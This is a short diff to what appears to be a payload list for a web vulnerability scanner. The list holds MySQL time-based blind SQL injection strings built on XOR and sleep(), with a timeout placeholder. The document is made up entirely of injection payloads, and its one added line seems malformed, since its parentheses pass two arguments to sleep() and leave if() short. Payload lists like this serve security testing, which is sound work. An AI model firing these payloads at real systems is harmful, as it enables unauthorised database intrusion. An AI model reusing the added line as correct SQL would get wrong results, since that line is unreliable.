@@ -1,3 +1,4 @@
+"0'XOR(if(now()=sysdate(),sleep((%__TIME_OUT__%-1),0))XOR'Z"
 "0"XOR(if(now()=sysdate()%2Csleep(%__TIME_OUT__%)%2C0))XOR"Z"
 0'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR'Z
 0\"XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR\"Z
